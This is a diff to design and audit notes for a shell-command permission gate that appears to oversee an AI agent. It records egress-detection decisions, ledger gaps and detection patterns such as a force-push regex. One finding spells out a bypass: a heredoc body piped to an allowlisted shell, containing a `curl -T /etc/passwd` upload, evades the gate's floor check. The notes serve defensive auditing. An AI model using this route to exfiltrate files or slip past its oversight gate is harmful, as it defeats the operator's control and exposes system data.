@@ -410,8 +410,10 @@ corpus shapes — `/proc/$EP/io`, `cd ~/Strata && python3 - <<EOF`,
   both judge clean when the complete command is fed. Complete the row (or drop
   it) before believing a replay stop. Since 3.44.0 the unresolved and judge
   ledgers MARK such a row (`cmdCut: true`) — find them with
-  `jq 'select(.cmdCut)'`; decisions.jsonl rows carry no marker, so a long
-  `target` there stays suspect on its face.
+  `jq 'select(.cmdCut)'`; decisions.jsonl marked its first rows in 3.51.0
+  (`targetCut: true`, `jq 'select(.targetCut)'`) — 50 of the 810 rows in the
+  2026-11-06 ledger had been cut in silence, which is what made two of its
+  egress rows unreplayable.
 
 ### Step 3 build notes (2026-10-19)
 
@@ -1223,7 +1225,9 @@ unevidenced scope creep — fail-closed).
   (`/\bgit\s+push\s+.*--force\b/i`), so the safer spelling is labelled
   `"git push --force"` and sits on the absolute bar. Not a false positive in the
   dangerous sense (it is still a force push), but the label mis-states the risk the
-  operator is asked about. Ledger: 1 row.
+  operator is asked about. Ledger: 1 row. **Fixed 3.51.0** — two patterns, and the
+  risk layer's reason now names the flag the command used (`--force`,
+  `--force-with-lease`, `-f`); `git push -f` staying off the bar is filed below.
 - **An unresolved token can never converge** — `unresolved.jsonl` shows the same token
   (`~/Strata-data/models`) with `n=10` and no path to an allow: a write-shaped stop
   whose dir was never granted, prompting identically every run. The convergence is an
@@ -1232,3 +1236,56 @@ unevidenced scope creep — fail-closed).
 - **Manual-mode auto-allow rows are thin** — 399 of 404 `kind: auto-allow` rows carry
   `reason: null` and no `mode`, so the ledger cannot answer "which rule allowed this".
   A ledger-shape gap (`gate/decision-log.ts`), not a gate defect.
+
+### Filed 2026-11-06 from the three-ledger audit (found, not built)
+
+Corpus `.log/*.jsonl`, 2026-11-03 → 11-06: 810 decision rows, 49 judge rows, 82
+unresolved rows. The window straddles 3.49.0 → 3.50.0, so the 11-03/11-04 rows are
+not replayable against current code — read them as history, not as a diff.
+
+- **The egress catch-all's evidence is wider than its trigger** —
+  `gate/dspa-gate.ts:451` (`networkHit`): the trigger is per-segment
+  (`segments.some(segmentHasUnknownCommand)`) but the URL scan reads the RAW whole
+  command, and segment texts exclude heredoc bodies (the parser protects them in
+  `handleRedirectedStatement`). So an address inside one segment's file content is
+  attributed to a later segment's unknown command: `cat > doc.md <<'EOF' …
+  https://example.com/docs … EOF` followed by `python3 tool.py` stops as egress to
+  `example.com`, which nothing contacts.
+  Measured on all 15 rows with `network egress (http…)` in the corpus: 7 are a
+  download a script the command runs does right then (`python3 - <<'PY'` bodies
+  resolving model files) — correct stops; 8 are `cat > f <<'EOF' … EOF` probe files
+  that the SAME command then ran with `node` (3 of those 8 were written by this
+  audit itself) — also correct, see the decision below; 0 are the document shape.
+  **Decided 2026-11-06: keep stopping.** An address in code the command runs now is
+  a destination. The judge may explain such a stop in the prompt, but it does not
+  clear egress (D-a: exfil is not intent-verifiable; D14's loopback loosening was
+  bought with a provable destination, not a verdict).
+  If the narrowing is ever built it must PROVE a body inert, not guess it: the
+  statement's verb is a byte copier (`cat`, `tee`, `sort`, …), no pipeline in or
+  above it (`cat <<'EOF' | sh` nests its pipeline INSIDE the heredoc node), the
+  write target is a literal no other command in the text names — `cat > x.sh <<EOF
+  … EOF; bash x.sh` is live code, which is what the 8 fixture rows are — and nothing
+  is blanked under a parse error (`<<A && … <<B` folds two bodies into one node).
+  Prototype built and reverted the same day: 180 lines in `analysis/bash-parser.ts`,
+  cleared 0 recorded prompts. The behaviour is pinned by tests in
+  `test/dspa-gate.test.ts` ("a URL in a HEREDOC BODY is evidence", "a URL in a body
+  the command only WRITES is still evidence").
+- **A body handed to an allowlisted shell is invisible to the trigger** — the same
+  asymmetry in the opposite direction, and the reason the raw scan is load-bearing:
+  `cat <<'EOF' | bash` with `curl -T /etc/passwd https://…` inside the body passes
+  the floor, because segment texts carry no body so `segmentHasUnknownCommand`
+  never fires and the URL scan is never consulted. The upload reaches the judge
+  only (the packet holds the full text). 0 rows in this corpus.
+- **`git push -f` is not on the absolute bar while `git push --force` is** — the
+  pattern matches the long form only; the short form is dangerous
+  (`GIT_DANGER_HANDLERS`, any push — `analysis/segment-helpers.ts:709`) and so is
+  judged rather than barred. The same history rewrite, one spelling away.
+- **`BODY_PATH_RE` mints web-route literals as paths** — `analysis/bash-parser.ts:1948`
+  (`bodyPaths()` at :1959) scans code bodies for `/a/b` shapes, so a python body's
+  `'/v1/status'` became an outside-path READ the guard can never answer:
+  `guard: "no reported path under /v1/status"` (unresolved.jsonl 2026-11-06
+  11:50:44, `intent-declined` → prompt; a second row at 14:54 is this audit re-running
+  the same command). The ≥2-segment rule already rejects `/props`; no safe
+  discriminator was found — the `fs.existsSync` test used for JS regex literals
+  would break body WRITES, which are non-existent by definition, and a
+  `v1|api|status` blocklist is brittle by construction. Ledger: 1 real row.
